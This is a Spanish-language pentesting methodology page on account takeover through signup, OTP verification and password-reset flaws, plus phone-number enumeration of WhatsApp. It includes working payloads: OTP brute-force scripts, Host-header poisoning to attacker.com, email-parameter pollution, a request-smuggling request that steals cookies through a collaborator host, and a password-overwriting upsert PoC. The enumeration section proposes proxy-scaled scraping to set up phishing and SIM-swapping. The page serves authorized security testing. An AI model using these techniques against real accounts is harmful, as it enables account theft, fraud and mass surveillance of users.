# Registro y vulnerabilidades de apropiación de cuentas

{{#include ../banners/hacktricks-training.md}}

## Apropiación por registro

### Registro duplicado

- Intenta generar usando un username existente
- Prueba variando el email:
- mayúsculas/minúsculas
- +1@
- añade algún punto en el email
- caracteres especiales en la parte local del email (%00, %09, %20)
- Pon caracteres en blanco después del email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prueba trucos de canonicalización del proveedor de email (dependiente del servicio):
- Gmail ignora puntos y subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` se entregan a `victim@gmail.com`
- Algunos proveedores son case-insensitive en la parte local
- Algunos proveedores aceptan confusables unicode. Prueba homoglyphs y soft hyphen `\u00AD` dentro de la parte local
- Abusa de esto para: bypass de las comprobaciones de unicidad, obtener cuentas duplicadas/invitaciones de workspace, o bloquear registros de la víctima (DoS temporal) mientras preparas una toma de control

### Username Enumeration

Comprueba si puedes determinar cuándo un username ya ha sido registrado dentro de la aplicación.

- Mensajes de error o códigos HTTP diferentes
- Diferencias de timing (el usuario existente puede desencadenar lookup a IdP/DB)
- Autocompletado del formulario de registro con datos de perfil para emails conocidos
- Revisa los flujos de equipo/invitación: introducir un email puede revelar si existe una cuenta

### Password Policy

Al crear un usuario comprueba la política de contraseñas (verifica si puedes usar contraseñas débiles).\
En ese caso puedes intentar un bruteforce de credenciales.

### SQL Injection

[**Revisa esta página** ](sql-injection/index.html#insert-statement) para aprender cómo intentar tomas de control de cuentas o extraer información vía **SQL Injections** en formularios de registro.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Cambiar email

Cuando estés registrado intenta cambiar el email y comprueba si este cambio se valida correctamente o si puedes cambiarlo por emails arbitrarios.

### Más comprobaciones

- Comprueba si puedes usar **disposable emails** (mailinator, yopmail, 1secmail, etc.) o evadir la blocklist con subaddressing como `victim+mailinator@gmail.com`
- **Contraseña larga** (>200) conduce a **DoS**
- **Comprueba los rate limits en la creación de cuentas**
- Usa username@**burp_collab**.net y analiza el **callback**
- Si se usa verificación por número de teléfono, revisa casos límite de parseo/inyección de teléfono

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Descubrimiento de contactos / oráculos de enumeración de identificadores

Los mensajeros centrados en número de teléfono exponen un **presence oracle** cada vez que el cliente sincroniza contactos. Reproducir las solicitudes de discovery de WhatsApp históricamente entregó **>100M lookups per hour**, permitiendo enumeraciones de cuentas casi completas.

**Flujo de ataque**

1. **Instrumenta un cliente oficial** para capturar la solicitud de subida de la libreta de direcciones (blob autenticado de números normalizados E.164). Repródúcela con números generados por el atacante reutilizando las mismas cookies/token de dispositivo.
2. **Agrupa números por request**: WhatsApp acepta miles de identificadores y devuelve registrados/no registrados más metadata (business, companion, etc.). Analiza las respuestas offline para construir listas de objetivos sin enviar mensajes a las víctimas.
3. **Escala horizontalmente** la enumeración con SIM banks, dispositivos en la nube o residential proxies para que no se dispare el throttling por cuenta/IP/ASN.

**Modelado del plan de marcación**

Modela el plan de marcación de cada país para omitir candidatos inválidos. El dataset NDSS (`country-table.*`) lista códigos de país, densidad de adopción y reparto por plataforma para que puedas priorizar rangos con alta probabilidad de acierto. Código de ejemplo para seedear:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Slice censuses by country/OS/app type to find regions with weak SMS filtering or heavy WhatsApp Business adoption for localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Verificación débil de Email/Teléfono (OTP/Magic Link)

Los flujos de registro suelen verificar la propiedad mediante un OTP numérico o un token de magic-link. Fallos típicos:

- OTP adivinable o corto (4–6 dígitos) sin rate limiting efectivo ni IP/device tracking. Pruebe adivinanzas en paralelo y rotación de headers/IP.
- Reutilización de OTP entre acciones o cuentas, o no vinculado al usuario/acción específica (p. ej., el mismo código funciona para login y signup, o funciona después de cambiar el email).
- Multi-value smuggling: algunos backends aceptan múltiples códigos y verifican si alguno coincide. Pruebe:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguir wrong vs expired vs wrong-user codes por status/message/body length.
- Tokens no invalidados después del éxito o después de cambiar la password/email.
- Verification token no ligado a user agent/IP, permitiendo completion cross-origin desde páginas controladas por el atacante.

Ejemplo de fuerza bruta con ffuf contra un JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Adivinación paralela/concurrente para eludir bloqueos secuenciales (usar Turbo Intruder en Burp):

<details>
<summary>Fragmento de Turbo Intruder para inundar intentos de OTP de 6‑dígitos</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Intenta una carrera de verificación: envía el mismo OTP válido simultáneamente en dos sesiones; a veces una sesión se convierte en una cuenta atacante verificada mientras que el flujo de la víctima también tiene éxito.
- También prueba Host header poisoning en los enlaces de verificación (igual que reset poisoning más abajo) para leak o completar la verificación en un host controlado por el atacante.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Técnicas de Pre‑Hijacking de cuentas (antes de que la víctima se registre)

Una clase potente de problemas ocurre cuando un atacante realiza acciones sobre el email de la víctima antes de que esta cree su cuenta, y luego recupera el acceso más tarde.

Técnicas clave a probar (adáptalas a los flujos del objetivo):

- Classic–Federated Merge
  - Attacker: registers a classic account with victim email and sets a password
  - Victim: later signs up with SSO (same email)
  - Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
  - Attacker: creates account and holds a long‑lived session (don’t log out)
  - Victim: recovers/sets password and uses the account
  - Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
  - Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
  - Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
  - Attacker: initiates email‑change to attacker mail and withholds confirmation
  - Victim: recovers the account and starts using it
  - Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
  - Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
  - Victim: signs up via classic route
  - Service merges on email without checking `email_verified` or performing local verification

Consejos prácticos

- Harvest flows and endpoints from web/mobile bundles. Busca classic signup, SSO linking, cambio de email/teléfono y endpoints de password reset.
- Crea automatizaciones realistas para mantener las sesiones activas mientras pruebas otros flujos.
- Para pruebas de SSO, despliega un OIDC test provider y emite tokens con `email` claims para la dirección de la víctima y `email_verified=false` para comprobar si el RP confía en IdPs no verificados.
- Después de cualquier password reset o cambio de email, verifica que:
  - todas las demás sesiones y tokens queden invalidadas,
  - las capacidades pendientes de cambio de email/teléfono se cancelen,
  - los IdPs/emails/teléfonos previamente vinculados se re‑verifiquen.

Nota: Metodología extensa y casos de estudio de estas técnicas están documentados en la investigación de pre‑hijacking de Microsoft (ver References al final).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicita el password reset a tu dirección de email
2. Haz clic en el password reset link
3. No cambies la contraseña
4. Haz clic en cualquier web de 3rd party (eg: Facebook, twitter)
5. Intercepta la petición en el proxy de Burp Suite
6. Comprueba si el referer header está leaking el password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepta la petición de password reset en Burp Suite
2. Añade o edita los siguientes headers en Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Reenvía la petición con el header modificado\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Busca una URL de password reset basada en el _host header_ como: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR en parámetros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. El atacante debe iniciar sesión con su cuenta y acceder a la funcionalidad **Change password**.
2. Inicia Burp Suite e intercepta la petición.
3. Envíala a la pestaña Repeater y edita los parámetros: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

El token de restablecimiento de contraseña debe generarse aleatoriamente y ser único cada vez.\
Intenta determinar si el token expira o si siempre es el mismo; en algunos casos el algoritmo de generación es débil y puede ser adivinado. Las siguientes variables podrían ser usadas por el algoritmo.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Regístrate en el sistema con un username idéntico al del objetivo, pero con espacios en blanco insertados antes y/o después del username. e.g: `"admin "`
2. Solicita un password reset con tu username malicioso.
3. Usa el token enviado a tu email y restablece la contraseña de la víctima.
4. Conéctate a la cuenta de la víctima con la nueva contraseña.

La plataforma CTFd fue vulnerable a este ataque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encuentra un XSS dentro de la aplicación o en un subdominio si las cookies están scoped al dominio padre : `*.domain.com`
2. Leak the current **sessions cookie**
3. Autentícate como el usuario usando la cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** para detectar el tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crea una request que sobrescriba el `POST / HTTP/1.1` con los siguientes datos:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con el objetivo de open redirect a las víctimas hacia burpcollab y robar sus cookies\
3. La request final podría parecerse a la siguiente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crear un payload para el CSRF, e.g: “HTML form with auto submit for a password change”
2. Enviar el payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Editar el JWT con otro User ID / Email
- Comprobar si la firma JWT es débil


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Algunos signup handlers realizan un upsert cuando el email proporcionado ya existe. Si el endpoint acepta un body mínimo con un email y password y no aplica ownership verification, enviar el email de la víctima sobrescribirá su password pre-auth.

- Discovery: extraer nombres de endpoint desde bundled JS (o tráfico de la app móvil), luego fuzzear base paths como /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Method hints: un GET que devuelve mensajes como "Only POST request is allowed." suele indicar el verbo correcto y que se espera un JSON body.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Ejemplo PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impacto: Full Account Takeover (ATO) sin ningún reset token, OTP o email verification.

## Referencias

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
